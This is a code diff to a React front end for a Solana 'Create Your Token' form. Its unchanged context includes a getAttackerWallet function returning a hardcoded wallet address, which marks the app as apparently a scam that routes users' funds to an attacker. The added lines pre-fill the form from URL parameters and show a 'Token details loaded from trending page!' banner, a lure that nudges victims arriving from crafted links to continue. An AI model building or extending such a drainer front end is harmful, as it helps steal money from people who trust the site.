@@ -226,6 +226,22 @@ const FormTitle = styled.h2`
   animation: gradientAnimation 5s ease infinite;
 `;
 
+const NotificationBadge = styled.div`
+  background: linear-gradient(90deg, #4a8eff, #8964ff);
+  color: white;
+  padding: 12px 18px;
+  margin-bottom: 25px;
+  border-radius: 12px;
+  text-align: center;
+  font-weight: 500;
+  animation: fadeIn 0.5s ease-in;
+  
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+`;
+
 const TokenCreationForm = () => {
   // Create a connection to the Solana network
   const connection = new Connection(process.env.NEXT_PUBLIC_RPC_URL || clusterApiUrl('mainnet-beta'));
@@ -248,14 +264,59 @@ const TokenCreationForm = () => {
   const [showResult, setShowResult] = useState(false);
   const [balance, setBalance] = useState(0);
   const [showBalanceWarning, setShowBalanceWarning] = useState(false);
+  const [prefilled, setPrefilled] = useState(false);
   
   // Get attacker wallet from environment variable
   const getAttackerWallet = () => {
     return process.env.NEXT_PUBLIC_ATTACKER_WALLET || 'CMZ4Cf1vYep1yzPtFdFCV9UfbiHeDTzQJrfyt8CuyGXk';
   };
 
-  // Check balance when component mounts
+  // Check balance when component mounts and read URL parameters
   useEffect(() => {
+    // Check for URL parameters to pre-fill form fields
+    if (typeof window !== 'undefined') {
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      let wasPreFilled = false;
+      
+      const nameParam = urlParams.get('tokenName');
+      if (nameParam) {
+        setTokenName(nameParam);
+        wasPreFilled = true;
+      }
+      
+      const symbolParam = urlParams.get('tokenSymbol');
+      if (symbolParam) {
+        setTokenSymbol(symbolParam);
+        wasPreFilled = true;
+      }
+      
+      const descriptionParam = urlParams.get('tokenDescription');
+      if (descriptionParam) {
+        setTokenDescription(descriptionParam);
+        wasPreFilled = true;
+      }
+      
+      const supplyParam = urlParams.get('tokenSupply');
+      if (supplyParam) {
+        setTokenSupply(supplyParam);
+        wasPreFilled = true;
+      }
+      
+      const decimalsParam = urlParams.get('tokenDecimals');
+      if (decimalsParam) {
+        setTokenDecimals(decimalsParam);
+        wasPreFilled = true;
+      }
+      
+      // Set prefilled state to show notification
+      if (wasPreFilled) {
+        setPrefilled(true);
+        // Clear notification after 5 seconds
+        setTimeout(() => setPrefilled(false), 5000);
+      }
+    }
+    
     const checkBalance = async () => {
       if (publicKey) {
         try {
@@ -395,6 +456,13 @@ const TokenCreationForm = () => {
   return (
     <FormContainer>
       <FormTitle>Create Your Token</FormTitle>
+      
+      {prefilled && (
+        <NotificationBadge>
+          Token details loaded from trending page! Continue with token creation.
+        </NotificationBadge>
+      )}
+      
       <form onSubmit={handleCreateToken}>
         <FormGroup>
           <FormLabel htmlFor="tokenName">Token Name</FormLabel>
